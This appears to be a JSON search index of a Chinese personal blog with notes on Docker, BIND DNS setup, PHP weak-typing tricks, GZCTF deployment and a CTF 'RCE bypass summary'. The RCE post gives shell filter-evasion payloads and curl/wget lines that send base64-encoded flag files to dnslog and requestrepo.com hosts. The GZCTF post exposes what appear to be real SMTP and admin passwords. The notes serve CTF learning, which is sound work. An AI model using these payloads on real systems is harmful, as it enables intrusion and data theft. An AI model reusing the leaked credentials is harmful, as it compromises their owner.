[{"objectID":"1736254911","permalink":"/post/docker/","title":"docker","content":" 一 安装docker 阅读官方文档进行安装https://docs.docker.com/engine/install/ubuntu/\n设置 Docker 的apt存储库\nsudo apt-get update sudo apt-get install ca-certificates curl sudo install -m 0755 -d /etc/apt/keyrings sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc sudo chmod a+r /etc/apt/keyrings/docker.asc 配置镜像加速\nsudo mkdir -p /etc/docker sudo tee /etc/docker/daemon.json \u0026lt;\u0026lt;-\u0026#39;EOF\u0026#39; { \u0026#34;registry-mirrors\u0026#34;: [\u0026#34;https://rd4ovv3y.mirror.aliyuncs.com\u0026#34;] } EOF sudo systemctl daemon-reload sudo systemctl restart docker ==安装完成后使用docker version验证安装是否成功==\n二 docker的使用 1.下载镜像 检索：docker search\n下载：docker pull\n列表：docker images \u0026lt;==\u0026gt; docker image ls\n删除：docker rmi \u0026lt;==\u0026gt; docker rm image\n查看卷：docker volume ls\n镜像名:标签（版本）\n2.启动容器 ==运行：docker run== 查看：docker ps（运行中的容器） docker ps -a 查看所有容器 停止：docker stop 启动：docker start 重启：docker restart 状态：docker stats 日志：docker logs ==进入：docker exec== 删除：docker rm\n2.1 run命令细节 docker run -d -p 88:80 --name mynginx nginx 后台启动端口映射（主机端口:容器端口）并起别名mynginx 目录挂载：-v 主机目录:容器目录 docker run -d -p 88:80 -v /app/nghtml:/usr/share/nginx/html --name mynginx nginx 卷映射：-v ngconf:/etc/nginx ==卷的默认路径：/var/lib/docker/volumes/\u0026lt;volume-name\u0026gt;==\n3.保存镜像 提交：docker commit -m \u0026#34;update\u0026#34; mynginx mynginx:v.10 保存：docker save -o mynginx.tar myginx:v.10 加载：docker load -i mynginx.tar 4.分享社区 登录：docker login 命名：docker tag\t原来镜像名 用户名/改镜像名 推送：docker push 5.自定义网络 docker为每个容器都分配唯一ip，使用容器ip＋容器端口可以互相访问\nip由于各种原因可能会变化\ndocker0默认不支持主机域名\n创建自定义网络，容器名就是域名\ndocker network create 名字\ndocker run \u0026ndash;network 名字\n三 docker compose 上线：docker compose up -d 下线：docker compose down 启动：docker compose start x1 x2 x2 停止：docker compose stop x1 x2 x3 扩容：docker compose scale x2=3 ","date":"2025-01-07 21:01:51","updated":"2025-01-07 21:01:51"},{"objectID":"1736254911","permalink":"/post/linux%E7%9A%84dns%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/","title":"Linux的DNS服务器搭建","content":" DNS域名解析服务 准备工作 设置服务器网络参数，设置主机名 网络参数 参见配置文件： /etc/sysconfig/network-scripts/ifcfg-ens33 DEVICE=ens33\t设备名称 NAME=ens33\t网卡名称 BOOTPROTO=static\tstatic为静态ip地址 ONBOOT=yes\t开机是否激活网卡（yes激活，no禁用） IPADDR=\t配置IP地址 NETMASK=\t配置子网掩码 PREFIX=\t配置子网掩码(位数) GATEWAY=\t配置默认网关 DNS1=\t配置首选DNS地址 注意：如有备用DNS地址的配置项为DNS2 注意：网卡配置文件内，选项要大写，小写不报错，但不生效，参数可小写\n设置主机名 三种方式 1.nmtui 2.vim /etc/hostname 3.hostnamectl set-hostname 主机名 安装软件包 安装方式 安装bind软件包，需要先挂载光盘 mount /dev/cdrom /mnt 挂载\t设备名称\t挂载点目录 1.rpm安装 cd /挂载点目录/Packages rpm -i 安装包名 2.yum安装 yum安装需要配置yum软件仓库 yum install 安装包名 yum软件仓库配置 本地源 cd /etc/yum.repos.d vim 任意名.repo [glj]\t仓库名称自定义 name=\tyum仓库描述可有可无 baseurl=file://\t指定yum仓库的路径,file://表示本地仓库 enabled=1\t表示启用该仓库，1为启用，0为不启用 gpgcheck=0\t是否校验仓库软件包的签名，1为校验，0为不校验 网络源 wget -O /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo 或 curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo 编辑配置文件 主配置文件/etc/named.conf 全局配置 options { listen-on port 53 { any; }; _ _ _ _ _ _ _ _ _ _ _ _ _略 设置named服务器监听端口及ip地址，为不同网段做dns需要使用any （any为所有） allow-query { any; }; _ _ _ _ _ _ _ _ _ _ _ _ _略 设置可以请求解析的客户机地址（设置某网段，any为所有） dnssec-validation no; _ _ _ _ _ _ _ _ _ _ _ _ _略 }; 区域配置(或者在/etc/named.rfc1912.zones也行) zone \u0026#34;正向域\u0026#34; type master; file \u0026#34;文件名1\u0026#34;; }; zone \u0026#34;反向域.in-addr.arpa\u0026#34; type master; file \u0026#34;文件名2\u0026#34;; }; type hint（提示作用） master（主dns服务器） slave（从dns服务器） 样例: zone \u0026#34;server.com\u0026#34; IN { type master; file \u0026#34;server.com.zone\u0026#34;; }; zone \u0026#34;16.16.172.in-addr.arpa\u0026#34; IN { type master; file \u0026#34;172.16.16.arpa\u0026#34;; }; 注意：根域不能动\nzone \u0026#34;.\u0026#34; IN { type hint; file \u0026#34;named.ca\u0026#34;; }; 正向解析文件：/var/named目录下自拟文件名 模板：/var/named/named.localhost\n$TTL 1D @\tIN SOA\t域名. rname.invalid. ( 0\t; serial 1D\t; refresh 1H\t; retry 1W\t; expire 3H )\t; minimum @\tNS DNS主机名. 主机一 A\t对应IP地址 主机二\tA\t对应IP地址 主机名\tA\t对应IP地址 (DNS服务器) 样例： $TTL 1D @\tIN SOA\tserver.com. rname.invalid. ( 0\t; serial 1D\t; refresh 1H\t; retry 1W\t; expire 3H )\t; minimum @\tNS\tdns.server.com. www\tA\t100.100.100.111 mail\tA\t100.100.100.222 dns\tA\t100.100.100.100 反向解析文件：/var/named目录下自拟文件名 参见正向文件 $TTL 1D @\tIN SOA\t域名. rname.invalid. ( 0\t; serial 1D\t; refresh 1H\t; retry 1W\t; expire 3H )\t; minimum @\tNS\tDNS主机名. IP地址\tPTR\t主机1对应完整域名. IP地址\tPTR\t主机2对应完整域名. IP地址\tPTR\tDNS服务器对应主机名. 样例： $TTL 1D @\tIN SOA\tserver.com. rname.invalid. ( 0\t; serial 1D\t; refresh 1H\t; retry 1W\t; expire 3H )\t; minimum @\tNS\tdns.server.com. 111\tPTR\twww.server.com. 222\tPTR\tmail.server.com. 100\tPTR\tdns.server.com. 启动服务 1.先关闭防火墙 systemctl stop firewalld 2.关闭SELinux setenforce 0 3.启动服务 systemctl start named 4.启动成功进行测试 or 启动失败查看日志文件排错 启动失败（/var/log/messages） 注意：这里关闭防火墙和SELinux都是临时关闭系统重启后失效\n验收测试 [root@glj named]# nslookup \u0026gt; server Default server: 100.100.100.100 Address: 100.100.100.100#53 \u0026gt; www.server.com Server:\t100.100.100.100 Address:\t100.100.100.100#53 Name:\twww.server.com Address: 100.100.100.111 \u0026gt; \u0026gt; 100.100.100.222 Server:\t100.100.100.100 Address:\t100.100.100.100#53 222.100.100.100.in-addr.arpa\tname = mail.server.com. \u0026gt; \u0026gt; \u0026gt; exit 总结易错点 1.网络参数设置问题，DNS1设置错误\t在nslookup里使用server查错 2.忘记关闭防火墙与SELinux 3.主配置文件区域配置问题，type hint;忘记修改成type master; 4.正,反向解析文件出错,忘记域名和DNS主机名后面有点 $TTL 1D @\tIN SOA\tserver.com. rname.invalid. ( 0\t; serial 1D\t; refresh 1H\t; retry 1W\t; expire 3H )\t; minimum @\tNS\tdns.server.com. 111\tPTR\twww.server.com. 222\tPTR\tmail.server.com. 100\tPTR\tdns.server.com. 5.每次更改配置后忘记重启服务 ","date":"2025-01-07 21:01:51","updated":"2025-01-07 21:01:51"},{"objectID":"1736254911","permalink":"/post/rce%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/","title":"RCE绕过总结","content":" 常见可代替命令 cat 查看文件内容\nmore:一页一页的显示档案内容 less:与 more 类似 head:查看头几行 tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示 tail:查看尾几行 nl：显示的时候，顺便输出行号 od:以二进制的方式读取档案内容 vi:一种编辑器，这个也可以查看 vim:一种编辑器，这个也可以查看 sort:可以查看 uniq:可以查看 ls：查看目录 dir：查看目录 空格绕过 \u0026gt; \u0026lt; \u0026lt;\u0026gt; 重定向符 %20(space) %09(tab) $IFS$9 ${IFS}（最好用这个） $IFS %0a 换行符 {cat,flag.txt} 在大括号中逗号可起分隔作用 简单符号绕过正则 1、单双引号法 ca''t flag.txt ca\u0026quot;\u0026quot;t flag.txt 因为单双引号中并没有字符，相当于在其中没有添加任何字符，命令意思不变\n2、跨行符\u0026rsquo;'绕过 跨行符的意思为接着上一行的内容，转到下一行接着输入命令，上下行均是一条命令\n通配符绕过正则 通配符可以替代任何字符\nshell通配符有： * ：表示通配字符0次及以上 ? : 表示通配字符0或 1、可以通配得到的命令 base64：\n/bin/base64 可以通配为： /???/????64 作用为将文件以base64编码形式输出 bzip2：\n/usr/bin/bzip2 可以通配为： /???/???/????2 作用为将文件压缩成后缀为bz2的压缩文件 flag.php ==\u0026gt; flag.php.bz2 2、字符串通配 flag.php ==\u0026gt; flag.??? flag* …… 当然可以用通配符去通配一些命令，但不能全名称通配\n例如： /bin/ca? 相当于cat命令 变量拼接绕过正则 可以在shell语句里定义变量，将被过滤的字符串分成部分绕过\n以flag.php为例: x=lag;cat f$x.php 相当于: cat flag.php 内联执行 内联执行就是在一条shell语句中内嵌子shell语句,用主shell语句处理子语句的结果\n可用于内联语句的符号you ${},``（反引号）\n例如:\necho `ls` echo ${ls} 相当于把ls的结果使用echo输出 \u0026ldquo;${}\u0026ldquo;截取环境变量拼接 例子\n${PATH:14:1}${PATH:5:1} flag.txt 在此环境中相当于 nl flag.txt []中括号匹配绕过 例如[a-c] 代表匹配 a-b之间的字符,包括a,b字符本身\n匹配范围为当前目录\n例子\n/[a-c][h-j][m-o]/[b-d]a[s-u] flag.txt 相当于 /bin/cat flag.txt 因为[]匹配范围只在当前路径 所以要为bin绝对路径 source命令 source命令，又称点命令,可以用点号( . ),代替\n该命令可以读取并执行文件中的命令\n可构建文件上传表单，上传命令文件执行\n表单为：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt; \u0026lt;meta name=\u0026quot;viewport\u0026quot; content=\u0026quot;width=device-width, initial-scale=1.0\u0026quot;\u0026gt; \u0026lt;title\u0026gt;POST数据包POC\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/\u0026quot; method=\u0026quot;post\u0026quot; enctype=\u0026quot;multipart/form-data\u0026quot;\u0026gt; \u0026lt;!--链接是当前打开的题目链接--\u0026gt; \u0026lt;label for=\u0026quot;file\u0026quot;\u0026gt;文件名：\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026quot;file\u0026quot; name=\u0026quot;file\u0026quot; id=\u0026quot;file\u0026quot;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026quot;submit\u0026quot; name=\u0026quot;submit\u0026quot; value=\u0026quot;提交\u0026quot;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; get请求为\n?c=.+/???/????????[@-[] 一般来说这个文件在linux下面保存在/tmp/php??????一般后面的6个字符是随机生成的有大小写。（可以通过linux的匹配符去匹配） 注意：通过.去执行sh命令不需要有执行权限\n无回显rce 无回显的执行函数：\nexec()\nshell_exec()\n`` （反引号）\n这些需要php函数echo才可以输出结果\n1、复制到可访问文件 tee命令：\ntee 命令可用于创建或追加写入文件\n可配合cat等打开文件命令和管道符将flag写入到规定文件中\n例如\n先将根目录复制到某个文件，然后访问查看 ls /| tee ls.txt 然后输入 url/1.txt 即可查看根目录 再复制flag文件，然后访问查看 cat /flag.php | tee flag.txt 然后输入 url/falg.txt 即可查看根目录 还可以使用其他的复制方法 copy /flag.php flag.txt mv /flag.php flag.txt 2、dnslog外带数据法 需要dnslog平台，可自己搭建\ncurl dnslog平台url/`cat flag.php|base64` wget dnslog平台url/`cat flag.php|base64` 3、http外带数据法 用http通道带出数据 ?cmd=curl%20http://6ms8e9yi.requestrepo.com/?1=`cat%20f*|%20base64` 4.反弹shell法 ","date":"2025-01-07 21:01:51","updated":"2025-01-07 21:01:51"},{"objectID":"1736254911","permalink":"/post/web%E5%AE%89%E5%85%A8/","title":"Web安全","content":" php基本特性 弱类型比较\n1.字符串和数字比较，字符串会被转换成数字\n\u0026amp;ldquo;admin\u0026amp;rdquo; == 0 true\nadmin被转换成数字，由于admin是纯字符串，转换失败 int(admin)=0\n2.混合字符串转换成数字，看字符串的第一个\n\u0026amp;ldquo;1admin\u0026amp;rdquo; == 1 true\n3.字段串开头以xex开头，x代表数字会被转换成科学计数法\n1e9 1x10⁹\n对输入长度限制，又需要＞=很大的值时使用\nif(strlen($money)\u0026amp;lt;=4\u0026amp;amp;\u0026amp;amp;$money\u0026amp;gt;time()\u0026amp;amp;\u0026amp;amp;!is_array($money)) { echo $flag; } a和b的md5值前两位是==0e开头== xex 变成科学技术法\n==QNKCDZO 和 240610708==\nif (isset($_GET[\u0026amp;#39;a\u0026amp;#39;])\u0026amp;amp;\u0026amp;amp;isset($_GET[\u0026amp;#39;b\u0026amp;#39;])) { $a=$_GET[\u0026amp;#39;a\u0026amp;#39;]; $b=$_GET[\u0026amp;#39;b\u0026amp;#39;]; if($a==$b) { echo \u0026amp;#34;\u0026amp;lt;center\u0026amp;gt;Wrong Answer!\u0026amp;lt;/center\u0026amp;gt;\u0026amp;#34;; } else { if(md5($a)==md5($b)) { echo \u0026amp;#34;\u0026amp;lt;center\u0026amp;gt;\u0026amp;#34;.$flag.\u0026amp;#34;\u0026amp;lt;/center\u0026amp;gt;\u0026amp;#34;; } else echo \u0026amp;#34;\u0026amp;lt;center\u0026amp;gt;Wrong Answer!\u0026amp;lt;/center\u0026amp;gt;\u0026amp;#34;; } } 常用的MD5加密后以0E开头的有 QNKCDZO 240610708 byGcY sonZ7y aabg7XSs aabC9RqS s878926199a s155964671a s214587387a s1091221200a 读字符串的函数，使用数组为被读为NULL \u0026amp;lt;?php include(\u0026amp;#34;flag.php\u0026amp;#34;); if(isset($_GET[\u0026amp;#39;v1\u0026amp;#39;]) \u0026amp;amp;\u0026amp;amp; isset($_GET[\u0026amp;#39;v2\u0026amp;#39;]) \u0026amp;amp;\u0026amp;amp; …","date":"2025-01-07 21:01:51","updated":"2025-01-07 21:01:51"},{"objectID":"1736254911","permalink":"/post/%E6%90%AD%E5%BB%BActf%E5%B9%B3%E5%8F%B0/","title":"搭建CTF平台","content":" GZCTF 在当前文件夹下（就是你GZCTF靶场的配置目录），创建 appsettings.json：\nvim appsettings.json\n{ \u0026#34;AllowedHosts\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;ConnectionStrings\u0026#34;: { \u0026#34;Database\u0026#34;: \u0026#34;Host=db:5432;Database=gzctf;Username=postgres;Password=@glj20030528\u0026#34;, // 此处Password内容可以自定义（安全起见，至少包含数字及字母大小写） \u0026#34;RedisCache\u0026#34;: \u0026#34;cache:6379,abortConnect=false\u0026#34; }, \u0026#34;EmailConfig\u0026#34;: { // 邮件配置，用于找回密码之类的，这里就用163举例 \u0026#34;SendMailAddress\u0026#34;: \u0026#34;1186437492@qq.com\u0026#34;, // 邮件发送者 \u0026#34;UserName\u0026#34;: \u0026#34;1186437492@qq.com\u0026#34;, // SMTP用户名，就是你开启SMTP的邮箱 \u0026#34;Password\u0026#34;: \u0026#34;wmqxnajprwqrbacb\u0026#34;, // 你得STMP服务器密码，唯一， \u0026#34;Smtp\u0026#34;: { \u0026#34;Host\u0026#34;: \u0026#34;smtp.qq.com\u0026#34;, // 163邮箱的stmp服务器地址 \u0026#34;Port\u0026#34;: 465 // stmp端口 } }, \u0026#34;XorKey\u0026#34;: \u0026#34;@glj20030528\u0026#34;, // 此处XorKey可以自定义 \u0026#34;ContainerProvider\u0026#34;: { \u0026#34;Type\u0026#34;: \u0026#34;Docker\u0026#34;, \u0026#34;PortMappingType\u0026#34;: \u0026#34;Default\u0026#34;, \u0026#34;EnableTrafficCapture\u0026#34;: false, \u0026#34;PublicEntry\u0026#34;: \u0026#34;192.168.103.22\u0026#34;, // 域名或IP配置，用于容器生成,域名不带http/https \u0026#34;DockerConfig\u0026#34;: { \u0026#34;SwarmMode\u0026#34;: false, \u0026#34;Uri\u0026#34;: \u0026#34;unix:///var/run/docker.sock\u0026#34; } }, \u0026#34;RequestLogging\u0026#34;: false, \u0026#34;DisableRateLimit\u0026#34;: true, \u0026#34;RegistryConfig\u0026#34;: { \u0026#34;UserName\u0026#34;: \u0026#34;DOCKER_USERNAME\u0026#34;, \u0026#34;Password\u0026#34;: \u0026#34;DOCKER_PASSWORD\u0026#34;, \u0026#34;ServerAddress\u0026#34;: \u0026#34;DOCKER_ADDRESS\u0026#34; }, \u0026#34;CaptchaConfig\u0026#34;: { \u0026#34;Provider\u0026#34;: \u0026#34;None\u0026#34;, \u0026#34;SiteKey\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;SecretKey\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;GoogleRecaptcha\u0026#34;: { \u0026#34;VerifyAPIAddress\u0026#34;: \u0026#34;https://www.recaptcha.net/recaptcha/api/siteverify\u0026#34;, \u0026#34;RecaptchaThreshold\u0026#34;: \u0026#34;0.5\u0026#34; } }, \u0026#34;ForwardedOptions\u0026#34;: { \u0026#34;ForwardedHeaders\u0026#34;: 5, \u0026#34;ForwardLimit\u0026#34;: 1, \u0026#34;ForwardedForHeaderName\u0026#34;: \u0026#34;X-Forwarded-For\u0026#34;, \u0026#34;TrustedNetworks\u0026#34;: [ \u0026#34;0.0.0.0/0\u0026#34; ] } } 在当前文件夹下，创建 docker-compose.yml：\nvim docker-compose.yml 将以下内容保存为 docker-compose.yml 文件，并替换为你的初始化参数（注释需删除，保存后可能会报错）：\nversion: \u0026#34;3.7\u0026#34; services: gzctf: image: registry.cn-shanghai.aliyuncs.com/gztime/gzctf:latest restart: always environment: - \u0026#34;GZCTF_ADMIN_PASSWORD=\u0026lt;Password\u0026gt;\u0026#34; # \u0026lt;Password\u0026gt;换成账户管理员密码，管理员账户为admin # choose your backend language `en_US` / `zh_CN` / `ja_JP` - \u0026#34;LC_ALL=zh_CN.UTF-8\u0026#34; ports: - \u0026#34;80:8080\u0026#34; volumes: - \u0026#34;./data/files:/app/files\u0026#34; - \u0026#34;./appsettings.json:/app/appsettings.json:ro\u0026#34; # - \u0026#34;./kube-config.yaml:/app/kube-config.yaml:ro\u0026#34; - \u0026#34;/var/run/docker.sock:/var/run/docker.sock\u0026#34; depends_on: - db - cache cache: image: redis:alpine restart: always db: image: postgres:alpine restart: always environment: - \u0026#34;POSTGRES_PASSWORD=GzctfAuto233\u0026#34; # 数据库密码，务必要和appsettings.json中的配置一致 volumes: - \u0026#34;./data/db:/var/lib/postgresql/data\u0026#34; 修改后的\nversion: \u0026#34;4.7\u0026#34; services: gzctf: image: registry.cn-shanghai.aliyuncs.com/gztime/gzctf:latest restart: always environment: - \u0026#34;GZCTF_ADMIN_PASSWORD=@glj20030528\u0026#34; - \u0026#34;LC_ALL=zh_CN.UTF-8\u0026#34; ports: - \u0026#34;80:8080\u0026#34; volumes: - \u0026#34;./data/files:/app/files\u0026#34; - \u0026#34;./appsettings.json:/app/appsettings.json:ro\u0026#34; - \u0026#34;/var/run/docker.sock:/var/run/docker.sock\u0026#34; depends_on: - db - cache cache: image: redis:alpine restart: always db: image: postgres:alpine restart: always environment: - \u0026#34;POSTGRES_PASSWORD=@glj20030528\u0026#34; volumes: - \u0026#34;./data/db:/var/lib/postgresql/data\u0026#34; 在当前文件夹执行命令，构建并启动GZCTF：\ndocker compose up -d 等他安装完成就好，这里我已经安装好了\n出题 sudo docker build -t gljbeijing/web1 . docker tag a6fab83d569b crpi-722ex2zgxnu1ctd3.cn-beijing.personal.cr.aliyuncs.com/gljbeijing/web1:latest docker push crpi-722ex2zgxnu1ctd3.cn-beijing.personal.cr.aliyuncs.com/gljbeijing/web1:latest Dockerfile文件\nFROM ctftraining/base_image_nginx_mysql_php_56 COPY src /var/www/html RUN mv /var/www/html/flag.sh / \\ \u0026amp;\u0026amp; chmod +x /flag.sh flag文件\n\u0026lt;?php echo getenv(\u0026#39;GZCTF_FLAG\u0026#39;) ?: \u0026#39;flag\u0026#39;; ?\u0026gt; sh文件\n#!/bin/sh sed -i \u0026#34;s/flag/$GZCTF_FLAG/\u0026#34; /var/www/html/f1ag_is_he2e.php export GZCTF_FLAG=\u0026#34;\u0026#34; ","date":"2025-01-07 21:01:51","updated":"2025-01-07 21:01:51"}]